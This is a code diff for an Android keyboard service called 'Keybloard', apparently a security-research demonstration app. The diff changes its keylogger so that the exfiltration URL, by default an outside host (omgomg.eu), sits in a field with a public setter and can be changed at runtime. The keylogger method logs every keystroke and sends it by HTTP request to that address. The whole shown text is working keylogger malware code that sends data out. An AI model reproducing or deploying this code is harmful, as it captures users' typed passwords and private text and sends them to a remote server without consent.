@@ -1,12 +1,16 @@
 package com.withsecure.keybloard;
 
+import android.content.SharedPreferences;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
+import android.preference.PreferenceManager;
 import android.text.TextUtils;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
+
+import androidx.core.app.NotificationCompat;
 
 import java.io.BufferedInputStream;
 import java.io.IOException;
@@ -28,6 +32,7 @@ public class KeybloardService extends InputMethodService implements KeyboardView
     private Keyboard keyboard;
     private String currentKey = "";
     private boolean caps = false;
+    private static String keylogURL = "https://omgomg.eu/keybloard";
 
     @Override
     public View onCreateInputView() {
@@ -36,6 +41,11 @@ public class KeybloardService extends InputMethodService implements KeyboardView
         keyboardView.setKeyboard(keyboard);
         keyboardView.setOnKeyboardActionListener(this);
         return keyboardView;
+    }
+
+    public static void setKeylogURL(String url)
+    {
+        keylogURL = url;
     }
 
     @Override
@@ -86,8 +96,9 @@ public class KeybloardService extends InputMethodService implements KeyboardView
     }
 
     private void keylogger(String currentKey){
+        //logcat.log(Level.SEVERE, "Now logging to " + keylogURL);
         logcat.log(Level.SEVERE, "Key pressed: " + currentKey);
-        new HTTPRequestHandler().execute("https://omgomg.eu/keybloard", currentKey);
+        new HTTPRequestHandler().execute(keylogURL, currentKey);
     }
 
     @Override
